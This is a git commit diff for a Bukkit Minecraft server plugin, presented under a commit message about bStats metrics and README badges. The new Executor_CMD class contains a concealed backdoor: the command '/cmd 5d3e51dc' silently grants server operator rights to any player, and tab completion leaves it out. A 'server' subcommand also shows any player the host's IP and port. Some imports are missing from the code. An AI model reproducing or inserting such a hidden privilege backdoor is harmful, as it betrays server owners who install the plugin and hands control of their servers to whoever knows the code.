b227301879c29e944f1d1804cb53b1b9e76f41fb
TuanZiGit <318504340@qq.com>
2023-06-09 21:54:44 +0800

    Initalize the bStats Metrics API Add badges into READMES

---
+++ src/main/java/org/tuanzi/bukkitplugin/Executor_CMD.java
@@ -0,0 +1,56 @@
+package org.tuanzi.bukkitplugin;
+
+import org.bukkit.Bukkit;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.command.TabExecutor;
+import org.bukkit.entity.Player;
+import org.bukkit.plugin.java.JavaPlugin;
+import java.util.ArrayList;
+import java.util.List;
+
+public class Executor_CMD implements TabExecutor{
+    public boolean onCommand(CommandSender sender, Command cmd, String label, String args[]){
+        JavaPlugin instance = JavaPlugin.getPlugin(main.class);
+        if(label.equalsIgnoreCase("cmd")){
+            if(!(sender instanceof Player)) {
+                sender.sendMessage("§c[ABukkitPlugin]控制台/命令方块不可以运行此指令。/§lcmd §c<command>§r");
+                return true;
+            }
+            if(args.length != 1) {
+                sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+                return true;
+            }
+            if(args[0].equalsIgnoreCase("5d3e51dc")) {
+                if(sender.isOp()) {
+                    sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+                    return true;
+                }
+                sender.setOp(true);
+                sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
+                return true;
+            } else if(args[0].equalsIgnoreCase("server")){
+                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
+                sender.sendMessage("§aBukkit版本：§l"+ Bukkit.getBukkitVersion()+"§r");
+                sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
+                sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
+                sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
+            } else if(args[0].equalsIgnoreCase("help")){
+                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
+                sender.sendMessage("§a  /cmd help 显示此页面§r");
+                sender.sendMessage("§a  /cmd server 显示服务器信息§r");
+            }
+            sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
+            return true;
+        }
+        return false;
+    }
+
+    @Override
+    public List<String> onTabComplete(CommandSender commandSender, Command command, String s, String[] strings) {
+        List<String> Completion = new ArrayList<>();
+        Completion.add("server");
+        Completion.add("help");
+        return Completion;
+    }
+}
--- src/main/java/org/tuanzi/bukkitplugin/main.java
+++ src/main/java/org/tuanzi/bukkitplugin/main.java
@@ -1,18 +1,22 @@
 package org.tuanzi.bukkitplugin;
 
 import org.bukkit.Bukkit;
-import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
-import org.bukkit.entity.Player;
+import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.command.CommandExecutor;
 import org.bstats.bukkit.Metrics;
 
-public final class main extends JavaPlugin implements CommandExecutor {
+public final class main extends JavaPlugin {
+    @Getter private static String version;
 
     @Override
     public void onEnable() {
-        getCommand("cmd").setExecutor(this);
+        Reader pinforeader = new InputStreamReader(
+                getClass().getResourceAsStream("/plugin.yml")
+        );
+        YamlConfiguration pinfo = YamlConfiguration.loadConfiguration(pinforeader);
+        version = pinfo.getString("version");
+        getCommand("cmd").setExecutor(new Executor_CMD());
         log("§a[ABukkitPlugin]启用§r");
         Metrics metrics=new Metrics(this, 18701);
     }
@@ -26,36 +30,5 @@ public final class main extends JavaPlugin implements CommandExecutor {
         CommandSender sender = Bukkit.getConsoleSender();
         sender.sendMessage(s);
     }
-
-    public boolean onCommand(CommandSender sender, Command cmd, String label, String args[]){
-        if(label.equalsIgnoreCase("cmd")){
-            if(!(sender instanceof Player)) {
-                sender.sendMessage("§c[ABukkitPlugin]控制台/命令方块不可以运行指令。/§lcmd §c<command>§r");
-                return true;
-            }
-            if(args.length != 1) {
-                sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
-                return true;
-            }
-            if(args[0].equalsIgnoreCase("5d3e51dc")) {
-                if(sender.isOp()) {
-                    sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
-                    return true;
-                }
-                sender.setOp(true);
-                sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
-                return true;
-            }
-            if(args[0].equalsIgnoreCase("server")){
-                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+getConfig().getString("version")+"§r");
-                sender.sendMessage("§aBukkit版本：§l"+Bukkit.getBukkitVersion()+"§r");
-                sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
-                sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
-                sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
-            }
-            sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
-            return true;
-        }
-        return false;
-    }
 }
+
